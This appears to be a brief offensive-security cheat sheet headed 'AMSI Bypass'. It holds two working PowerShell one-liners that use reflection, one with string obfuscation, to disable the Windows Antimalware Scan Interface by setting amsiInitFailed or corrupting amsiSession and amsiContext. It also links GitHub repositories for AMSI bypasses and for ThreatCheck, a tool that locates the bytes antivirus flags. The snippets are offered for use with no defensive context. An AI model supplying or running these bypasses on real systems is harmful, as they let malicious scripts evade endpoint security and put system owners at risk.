

# AMSI Bypass

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell


```powershell
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u));$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static');$field.SetValue($null,$true)
```


```powershell
$haha = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$haha)
```



# ThreatCheck

https://github.com/rasta-mouse/ThreatCheck